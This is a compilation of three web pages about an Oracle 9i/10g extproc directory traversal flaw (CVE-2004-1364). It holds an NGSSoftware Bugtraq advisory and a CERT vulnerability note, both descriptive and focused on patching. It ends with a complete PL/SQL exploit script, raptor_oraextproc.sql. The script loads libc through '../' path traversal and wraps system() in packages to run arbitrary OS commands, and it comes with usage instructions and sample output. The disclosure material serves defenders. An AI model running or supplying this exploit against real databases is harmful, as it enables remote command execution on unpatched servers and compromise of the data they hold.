=== Content from marc.info_8617736b_20250126_000056.html ===

```
[[prev in list](?l=bugtraq&m=110382345829397&w=2)] [[next in list](?l=bugtraq&m=110382471608835&w=2)] [prev in thread] [[next in thread](?l=ntbugtraq&m=110392802225997&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [Oracle extproc directory traversal (#NISR23122004B)](?t=110382406800003&r=1&w=2)
From:       ["NGSSoftware Insight Security Research" <nisr () nextgenss ! com>](?a=100449261000003&r=1&w=2)
Date:       [2004-12-23 16:32:57](?l=bugtraq&r=1&w=2&b=200412)
Message-ID: [20041223161110.D0E2815F50F () mail ! ngssoftware ! com](?i=20041223161110.D0E2815F50F%20()%20mail%20!%20ngssoftware%20!%20com)
[Download RAW [message](?l=bugtraq&m=110382406002365&q=mbox) or [body](?l=bugtraq&m=110382406002365&q=raw)]

NGSSoftware Insight Security Research Advisory

Name: Oracle 10g/9i extproc directory traversal
Systems Affected: Oracle 10g/9i on all operating systems
Severity: Medium Risk
Vendor URL: <http://www.oracle.com/>
Author: David Litchfield [ davidl at ngssoftware.com ]
Relates to: <http://www.nextgenss.com/advisories/oracle-01.txt>
Date of Public Advisory: 23rd December 2004
Advisory number: #NISR23122004B
Advisory URL: <http://www.ngssoftware.com/advisories/oracle23122004B.txt>

Description
***********
The Oracle database server supports PL/SQL, a programming language. PL/SQL
can execute external procedures via extproc. Over the past few years there
has been a number of vulnerabilities in this area:

<http://www.nextgenss.com/advisories/oraplsextproc.txt>
<http://www.nextgenss.com/advisories/ora-extproc.txt>

Extproc has been found to suffer from a directory traversal problem that
allows attackers access to arbitray libraries.

Details
*******
extproc verifies that the library to be loaded is in the $ORACLE_HOME\bin
directory. This is to ensure that libraries outside of this directory cannot
be loaded. However, there exists a directory traversal issue whereby an
attacker can break outside of this constraint. This can allow attackers to
access libraries such as libc and msvcrt.dll. By calling the system()
function attackers can run arbitrary OS commands.

Fix Information
***************
A patch (#68) was released for this problem by Oracle. See
<http://metalink.oracle.com/> for more details. NGSSQuirreL for Oracle
(<http://www.nextgenss.com/squirrelora.htm>), can be used to assess whether
your Oracle servers are vulnerable to this.

About NGSSoftware
*****************
NGSSoftware design, research and develop intelligent, advanced application
security assessment scanners. Based in the United Kingdom, NGSSoftware have
offices in the South of London and the East Coast of Scotland. NGSSoftware's
sister company NGSConsulting, offers best of breed security consulting
services, specialising in application, host and network security
assessments.

<http://www.ngssoftware.com/>

Telephone +44 208 401 0070
Fax +44 208 401 0076

enquiries@ngssoftware.com

[[prev in list](?l=bugtraq&m=110382345829397&w=2)] [[next in list](?l=bugtraq&m=110382471608835&w=2)] [prev in thread] [[next in thread](?l=ntbugtraq&m=110392802225997&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)



=== Content from www.kb.cert.org_1514f375_20250126_000058.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#316206

## Oracle Database Server contains several vulnerabilities

#### Vulnerability Note VU#316206

Original Release Date: 2004-09-01 | Last Revised: 2004-09-01

---

### Overview

Several vulnerabilities exist in the Oracle Database Server and Listener. According the the Oracle Security Alert, exploitation of these vulnerabilities would require the attacker to have network access, but not a valid user account on the vulnerable system.

### Description

| Oracle Database 10g Release 1 version 10.1.0.2, Oracle9i Database Server Release 2 versions 9.2.0.4 and 9.2.0.5, Oracle9i Database Server Release 1 versions 9.0.1.4, 9.0.1.5 and 9.0.4, and Oracle8i Database Server Release 3 version 8.1.7.4 contain multiple vulnerabilities in the in the Database Server and Listener. In order to exploit these vulnerabilities an attacker would need to have network access to the vulnerable systems. |
| --- |

### Impact

| The complete impact of this vulnerabilities is not clear. Oracle has rated this issue as High. For more information about Oracle's severity ratings please see:  <http://otn.oracle.com/deploy/security/pdf/oracle_severity_ratings.pdf> |
| --- |

### Solution

| Apply the appropriate patch or upgrade as specified in the [Oracle Security Alert #68 (pdf)](http://www.oracle.com/technology/deploy/security/pdf/2004alert68.pdf).  For sites that use Oracle's Collaboration Suite or E-Business Suite 11i, please see [Oracle Security Alert #68 (pdf)](http://www.oracle.com/technology/deploy/security/pdf/2004alert68.pdf) for remediation instructions. |
| --- |

### Vendor Information

316206
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23316206/) to view vendors.**
### [Oracle Corporation](#JARL-64EP9K) Affected

Updated:  September 01, 2004

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

The vendor has not provided us with any further information regarding this vulnerability.

### Addendum

Please see the [Oracle Security Alert #68 (pdf)](http://www.oracle.com/technology/deploy/security/pdf/2004alert68.pdf).

If you have feedback, comments, or additional information about this vulnerability, please send us email.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base |  |  |
| Temporal |  |  |
| Environmental |  |  |

### References

* <http://www.oracle.com/technology/deploy/security/alerts.htm>
* <http://www.securitytracker.com/alerts/2004/Aug/1011110.html>
* <http://secunia.com/advisories/12409/>
* <http://www.oracle.com/technology/deploy/security/alerts.htm>
* <http://www.securitytracker.com/alerts/2004/Sep/1011125.html>
### Acknowledgements

These vulnerabilities were discovered by several parties and reported in an Oracle Security Alert.

This document was written by Jason A Rafail.

### Other Information

| **CVE IDs:** | [None](http://web.nvd.nist.gov/vuln/detail/None) |
| --- | --- |
| **Severity Metric:** | 24.68 |
| **Date Public:** | 2004-08-10 |
| **Date First Published:** | 2004-09-01 |
| **Date Last Updated:** | 2004-09-01 18:33 UTC |
| **Document Revision:** | 14 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from www.0xdeadbeef.info_81c54d23_20250126_000057.html ===
--
-- $Id: raptor\_oraextproc.sql,v 1.1 2006/12/19 14:21:00 raptor Exp $
--
-- raptor\_oraextproc.sql - command exec via oracle extproc
-- Copyright (c) 2006 Marco Ivaldi
--
-- Directory traversal vulnerability in extproc in Oracle 9i and 10g
-- allows remote attackers to access arbitrary libraries outside of the
-- $ORACLE\_HOME\bin directory (CVE-2004-1364).
--
-- This PL/SQL code exploits the Oracle extproc directory traversal bug
-- to remotely execute arbitrary OS commands with the privileges of the DBMS
-- user (the CREATE [ANY] LIBRARY privilege is needed).
--
-- See also:
-- http://www.0xdeadbeef.info/exploits/raptor\_oraexec.sql
-- http://www.0xdeadbeef.info/exploits/raptor\_orafile.sql
--
-- Vulnerable platforms:
-- Oracle 9i (all versions?)
-- Oracle 10g versions prior to 10.1.0.3
--
-- Tested on Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production,
-- running on both Solaris 9 and 10 systems. It will need some tweakings to
-- properly work on other platforms.
--
-- Usage example:
-- $ echo $ORACLE\_HOME
-- /opt/oracle/
-- $ sqlplus "/ as sysdba"
-- [...]
-- Connected to:
-- Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production
-- With the Partitioning, OLAP and Oracle Data Mining options
-- JServer Release 9.2.0.1.0 - Production
-- SQL> @raptor\_oraextproc.sql
-- [...]
-- exec oracmd32.exec('touch /tmp/32');
-- [...]
-- ERROR at line 1:
-- ORA-06520: PL/SQL: Error loading external library
-- ORA-06522: ld.so.1: extprocPLSExtProc: fatal:
-- /opt/oracle/bin/../../../../../../../lib/32/libc.so.1: wrong ELF class:
-- ELFCLASS32
-- [...]
-- SQL> exec oracmd64.exec('touch /tmp/64');
-- SQL> !ls -l /tmp/64
-- -rw-r--r-- 1 oracle orainst 0 Dec 19 13:49 /tmp/64
--
-- library for 32-bit oracle releases
create or replace library exec\_shell32 as
'$ORACLE\_HOME/bin/../../../../../../../lib/32/libc.so.1';
/
-- library for 64-bit oracle releases
create or replace library exec\_shell64 as
'$ORACLE\_HOME/bin/../../../../../../../lib/64/libc.so.1';
/
-- package for 32-bit oracle releases
-- usage: exec oracmd32.exec('command');
create or replace package oracmd32 as
procedure exec(cmdstring in char);
end oracmd32;
/
create or replace package body oracmd32 as
procedure exec(cmdstring in char)
is external
name "system"
library exec\_shell32
language c;
end oracmd32;
/
-- package for 64-bit oracle releases
-- usage: exec oracmd64.exec('command');
create or replace package oracmd64 as
procedure exec(cmdstring in char);
end oracmd64;
/
create or replace package body oracmd64 as
procedure exec(cmdstring in char)
is external
name "system"
library exec\_shell64
language c;
end oracmd64;
/

